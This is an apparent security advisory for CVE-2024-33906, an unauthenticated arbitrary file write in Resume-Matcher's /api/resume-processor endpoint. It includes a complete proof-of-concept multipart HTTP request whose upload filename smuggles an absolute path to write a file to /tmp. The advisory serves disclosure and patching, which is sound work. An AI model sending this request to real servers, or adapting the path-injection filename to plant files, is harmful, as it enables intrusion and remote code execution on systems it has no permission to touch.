---
title: "Arbitrary File Write in Resume-Matcher"
date: 2024-04-29
tags:
	- "arbitrary file write"
advisory: true
origin:
cves: 
	- CVE-2024-33906
ghsas:
---
# Description
Resume-Matcher through 0.1.1-alpha is susceptible to arbitrary file write due to improper file path validation in the `/api/resume-processor` endpoint. An attacker could upload a malicious file to an arbitrary location on the server, which results in remote code execution in most system configurations.

# Explotation
1. The following request will create a `/tmp/pwn.example` file.

```
POST /api/resume-processor HTTP/1.1
Host: 127.0.0.1:8000

Content-Length: 335
Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryB7BMKT4iboAIYDLB

------WebKitFormBoundaryB7BMKT4iboAIYDLB
Content-Disposition: form-data; name="resume"; filename="/tmp/pwn.example"
Content-Type: application/pdf
file-data

------WebKitFormBoundaryB7BMKT4iboAIYDLB
Content-Disposition: form-data; name="jobs"
Content-Type: application/json
{}

------WebKitFormBoundaryB7BMKT4iboAIYDLB--
```

# Impact
Unauthenticated attacker can upload arbitrary files into the server which results in remote code execution in most system configurations.

# Mitigation
Upgrade Resume-Matcher to the latest version.

# References
* [Commit](https://github.com/srbhr/Resume-Matcher/commit/f2c28b4b4bff4070582fdd1c87563e4a68601a69)